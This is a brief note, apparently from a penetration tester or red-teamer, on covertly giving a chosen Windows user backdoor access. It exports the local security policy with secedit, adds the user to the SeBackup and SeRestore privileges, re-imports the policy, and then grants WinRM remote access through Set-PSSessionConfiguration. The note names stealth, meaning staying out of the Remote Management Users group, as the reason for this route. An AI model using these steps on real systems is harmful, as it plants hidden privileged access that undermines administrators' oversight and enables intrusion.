Export config

> secedit /export /cfg config.inf

Open file in notepad and search for SeBackup and SeRestore.
Add a comma at the end and add the username you want to have rights.
Do that for both backup and restore.

Now convert it back.

> secedit /import /cfg config.inf /db config.db
> secedit /configure /db config.db /cfg config.inf

So we don't have to add the user to remote management users and we want to be more stealthy lets allow winrm this way.

> Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDiscriptorUI

Add user to popup.  



